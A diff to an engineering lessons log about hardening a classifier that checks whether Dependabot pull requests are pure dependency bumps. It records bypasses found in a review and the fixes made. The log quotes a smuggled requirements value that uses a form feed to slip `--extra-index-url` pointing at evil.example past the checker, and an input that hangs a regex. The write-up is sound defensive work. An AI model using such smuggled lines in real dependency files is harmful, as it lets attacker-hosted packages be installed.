@@ -3449,7 +3449,49 @@ files. Name and version must be plain before they reach the URL, for the reason
 lesson 117 gives. `verify-deps` counts the packages the classifier declared
 against the ones it verified, as it does for pins and images.
 
-24 tests, each refusal asserting its own reason; the checker runs offline
-against a `file://` tree through `MAINTAINER_PYPI_URL`. 16 mutants, one per
+48 tests, each refusal asserting its reason text; the checker runs offline
+against a `file://` tree through `MAINTAINER_PYPI_URL`. 30 mutants, one per
 guard, all killed, run against a slice of the suite with each file restored from a
 pristine copy and its hash checked.
+
+## 119. The classifier split lines where git does not, and a review found nineteen ways through
+
+A Sonnet review of the pip arm, briefed to break it, came back with nineteen
+diffs the classifier called pure bumps. Every one reproduced. Three causes:
+
+- `parse()` split the diff with `str.splitlines()`, which breaks at form feed,
+  vertical tab, `\x1c`-`\x1e`, NEL, U+2028, U+2029 and a lone CR. git ends a
+  diff line at newline only, and `parse()` keeps only fragments that start with
+  `+` or `-`, so a fragment after one of those characters vanished from the
+  verdict while pip, which splits the same way Python does, installed it:
+  `+    --hash=...\x0c --extra-index-url https://evil.example/simple` passed and
+  pip's own parser read the extra index. YAML treats NEL and U+2028 as line
+  breaks too, so the workflow arm had the same blind spot.
+- Inside a hunk, a removed line `-- --index-url x` prints as `--- --index-url x`,
+  and `parse()` skipped every line starting `--- ` as a file header. Hunk lines
+  are now counted from the `@@` header, so a header can only appear between
+  hunks.
+- The pip arm checked each line's grammar and never the pair of lines a bump
+  is: a removed pin and an added pin of the same package at a higher version.
+  A swap, a removal, a deletion, a marker flip, a downgrade and a pin moved
+  without its hashes all kept the grammar. A hash under another package's
+  unchanged pin, in a later hunk, was credited to the last added package,
+  because context lines are dropped and nothing marked where a hunk began.
+
+The marker regex also backtracked: `a==1 ;` and 1500 spaces ran past 30
+seconds. The parser now fullmatches one character class at a time, caps a line
+at 1000 characters, and `verify-deps` puts a timeout around the classifier.
+
+One fix of mine was wrong in its reason. I read stdin as bytes "because
+text-mode stdin turns a lone CR into a newline"; on Linux CPython opens stdin
+with `newline="\n"`, so it does not, and the mutant that went back to text mode
+survived. What the bytes read does buy is strict UTF-8 whatever the locale,
+and that now has its own test.
+
+**Guard:** the line-break refusal, hunk counting, rename/delete/empty-file
+refusals, UTF-8 decoding, the hunk sentinel, the pairing checks and the line cap,
+each with a test built from the review's input, and a mutant per guard (30
+in all, every one killed). Before merging, the new parser ran over the 25 most
+recent merged Dependabot pull requests on sysknife: same verdict, same line,
+pin and image counts for all 25.
+
